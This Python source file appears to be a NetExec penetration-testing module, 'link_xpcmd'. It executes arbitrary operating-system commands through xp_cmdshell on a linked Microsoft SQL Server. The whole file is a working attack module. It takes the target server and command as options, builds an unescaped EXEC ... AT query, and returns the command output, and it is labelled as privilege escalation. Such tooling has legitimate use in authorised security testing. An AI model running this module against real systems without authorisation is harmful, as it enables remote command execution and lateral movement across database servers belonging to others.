from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Run xp_cmdshell commands on a linked SQL server
    Module by deathflamingo
    """

    name = "link_xpcmd"
    description = "Run xp_cmdshell commands on a linked SQL server"
    supported_protocols = ["mssql"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.linked_server = None
        self.command = None

    def options(self, context, module_options):
        """
        Defines the options for running xp_cmdshell commands on a linked server.
        LINKED_SERVER    The name of the linked SQL server to target.
        CMD              The command to run via xp_cmdshell.
        """
        self.linked_server = module_options.get("LINKED_SERVER")
        self.command = module_options.get("CMD")

    def on_login(self, context, connection):
        self.context = context
        self.mssql_conn = connection.conn
        if not self.linked_server or not self.command:
            self.context.log.fail("Please provide both LINKED_SERVER and CMD options.")
            return

        self.context.log.display(f"Running command on {self.linked_server}: {self.command}")
        query = f"EXEC ('xp_cmdshell ''{self.command}''') AT [{self.linked_server}]"
        result = self.mssql_conn.sql_query(query)

        if result:
            output_lines = []
            for row in result:
                output_value = row.get("output")
                if output_value and output_value != "NULL":
                    output_lines.append(str(output_value))

            if output_lines:
                self.context.log.success("Executed command via linked server")
                for line in output_lines:
                    self.context.log.highlight(line.strip())
            else:
                self.context.log.display("Command executed but returned no output")
        else:
            self.context.log.fail("No result returned from query")
